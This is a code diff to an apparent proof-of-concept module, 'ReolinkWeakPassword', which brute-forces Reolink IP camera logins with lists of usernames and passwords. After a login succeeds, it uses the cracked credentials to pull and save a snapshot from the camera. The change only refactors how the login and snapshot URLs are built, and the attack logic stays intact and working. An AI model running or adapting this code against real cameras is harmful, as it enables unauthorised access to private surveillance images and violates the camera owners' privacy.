@@ -16,8 +16,7 @@ class ReolinkWeakPassword(POCTemplate):
         headers = {"User-Agent": self.config.user_agent}
         for user in self.config.users:
             for password in self.config.passwords:
-                url = (f"http://{ip}:{port}/api.cgi?"
-                       f"cmd=Login&user={user}&password={password}")
+                url = self.url(ip, port, f"/api.cgi?cmd=Login&user={user}&password={password}")
                 try:
                     r = self.session.get(url, headers=headers,
                                          timeout=self.config.timeout, verify=False)
@@ -35,8 +34,7 @@ class ReolinkWeakPassword(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul = results
         return self._snapshot(
-            f"http://{ip}:{port}/cgi-bin/api.cgi?"
-            f"cmd=Snap&channel=0&rs=abc&user={user}&password={password}",
+            self.url(ip, port, f"/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=abc&user={user}&password={password}"),
             f"{ip}-{port}-{user}-{password}-reolink.jpg")
 
 
